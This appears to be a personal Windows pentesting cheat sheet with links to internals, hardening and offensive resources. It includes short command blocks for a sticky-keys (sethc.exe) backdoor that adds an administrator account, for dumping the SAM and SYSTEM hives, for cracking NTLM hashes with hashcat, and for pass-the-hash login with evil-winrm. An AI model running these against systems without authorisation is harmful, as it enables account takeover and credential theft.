## Documentation

- https://ss64.com/ps/
- https://gist.github.com/pcgeek86/336e08d1a09e3dd1a8f0a30a9fe61c8a
- https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters

- http://ntoskrnl.org/ # description os + win internals
- https://www.vergiliusproject.com/ # documentation de tous les kernel win

- https://empyreal96.github.io/nt-info-depot/index.html
- https://0xpat.github.io/Malware_development_part_1/
- https://itm4n.github.io/

### Outils

- https://lolbas-project.github.io/
- https://www.loldrivers.io/
- https://learn.microsoft.com/en-us/windows/powertoys/
- https://github.com/k-lfa/MS-CTFPreparator #hardening
- https://learn.microsoft.com/fr-fr/sysinternals/downloads

### Change password (unlocked bios)

- https://maggick.fr/pages/lost-windows-password.html

```powershell
# boot linux
mount /dev/sdax /mnt
cp /mnt/Windows/System32/sethc.exe /mnt/Windows/System32/sethc_old.exe
cp /mnt/Windows/system32/cmd.exe /mnt/Windows/System32/sethc.exe

# boot windows + press shift 5 times
net user new_user new_password /add
net localgroup Administrators new_user /add
net user new_user /delete /f
```

### Crack password (persistent access)

- https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/

```powershell
# /System32/config
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save

impacket-secretsdump -sam sam.save -system system.save LOCAL #paste dump hashes in hashes.txt

hashcat -m 1000 hashes.txt wordlist.txt
evil-winrm -i <ip> -u <user> -p <passwd>
evil-winrm -i <ip> -u <user> -H <hash>
```

### Delete file

**Réécriture 5 fois**

```powershell
Sdelete64.exe /p 5 "c:\users\user\file.txt"
```

### Drivers

```powershell
# Activate Kernel Memory Isolation
pnputil /enum-drivers
pnputil /delete-driver oemXX.inf /force
```

### Malware

https://www.youtube.com/watch?v=aNEqC-U5tHM&t=1470s&ab_channel=crow

### Windows setup

- https://www.stashofcode.fr/reinstaller-et-nettoyer-windows-10-pour-plus-de-confidentialite/
- https://learn.microsoft.com/en-us/windows/terminal/tutorials/custom-prompt-setup
- https://learn.microsoft.com/fr-fr/windows/powertoys/install

### Windows internals

- https://repo.zenk-security.com/Linux%20et%20systemes%20d.exploitations/Windows%20Internals%20Part%201_6th%20Edition.pdf
- https://repo.zenk-security.com/Linux%20et%20systemes%20d.exploitations/Windows%20Internals%20Part%202_6th%20Edition.pdf
- https://repo.zenk-security.com/Linux%20et%20systemes%20d.exploitations/Windows%20Kernel%20Architecture%20Internals.pdf

### Potato - Local Privesc

- https://jlajara.gitlab.io/Potatoes_Windows_Privesc

### EDR

- https://virtualsamuraii.github.io/redteam/anatomie-des-edr-pt-1/


### Windows11

- https://github.com/xaitax/TotalRecall
